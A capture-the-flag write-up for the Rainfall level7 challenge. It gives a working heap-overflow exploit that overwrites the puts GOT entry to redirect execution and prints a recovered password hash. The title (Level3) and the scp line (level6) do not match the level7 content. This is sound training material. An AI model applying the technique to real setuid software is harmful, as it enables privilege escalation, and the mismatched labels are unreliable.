# Rainfall - Level3 Walkthrough

```bash
level7@RainFall:~$ file level7 
level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped

level7@RainFall:~$ checksec --file level7 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level7
```

We have a 32-bit ELF file with no specific security.

We copy the file `/home/user/level6/level6` locally:

```bash
scp -P 4242 level6@{IP}:/home/user/level6/level6 .
```


Open the binary in Ghidra.


The `main` function stores the flag in global variable `c`.
```c
__stream = fopen("/home/user/level8/.pass","r");
fgets(c,0x44,__stream);
```

The `m` function displays the variable `c`.
```c
printf("%s - %d\n",c,tVar1);
```

=> We need to find a way to call fuction `m`

Then in main `puts` is used.
If we could do so `puts` points to `m`, the flag would be displayed



```bash
$ gdb ./level7 

(gdb) disas main
...
0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
0x08048536 <+21>:	mov    %eax,0x1c(%esp)
...
0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
...

# First break after first malloc, we'll check the value of eax to check where is our pointer on the heap
(gdb) break *0x08048536
...

# Second break just before fopen as this fails in GDB and would segfault next line
(gdb) break *0x080485d3
...

(gdb) run AAAA BBBB
Starting program: /home/user/level7/level7 AAAA BBBB

Breakpoint 1, 0x08048536 in main ()

# Retrieve allocated pointer
(gdb) info register eax
eax            0x804a008	134520840

# Go to next breakpoint
(gdb) continue
Continuing.

Breakpoint 2, 0x080485d3 in main ()

# Display heap memory after the first allocation
(gdb) x/100x 0x804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x41414141	0x00000000	0x00000000	0x00000011
0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
0x804a038:	0x42424242	0x00000000	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
...
```

We notice here that AAAA is at address 0x804a018
We notice here that BBBB is at address 0x804a038
The address where B is stored (=0x804a028) is also stored at 0x804a02c
The assumption is that the value stored at 0x804a02c stores the address where our second parameter (here 'BBBB') is stored.
A param1 large enought would overflow and overwrite the content of 0x804a02c.

0x804a02câˆ’0x804a018 = 0x14 = 20

```bash
run $(python -c print'"A"*20 + "\x08\x04\xa0\x3c"[::-1]') BBBB

(gdb) x/100x 0x804a008
0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x0804a03c	0x00000000	0x00000011
0x804a038:	0x00000000	0x42424242	0x00000000	0x00020fc1
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
```

That proves that we have the control to write any value (here 'BBBB') at the address of our choice (here 0x0804a03c).

So we'll replace the address of `puts` with the one of `m` which would print the content of file /home/user/level8/.pass.

```
(gdb) info func
...
0x080484f4  m
0x08048400  puts
...

(gdb) disas *0x08048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```

- the address of `puts` is 0x8049928
- the address of `m` is 0x080484f4

```bash
./level7 $(python -c print'"A"*20 + "\x08\x04\x99\x28"[::-1]') $(python -c print'"\x08\x04\x84\xf4"[::-1]')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1768825535
```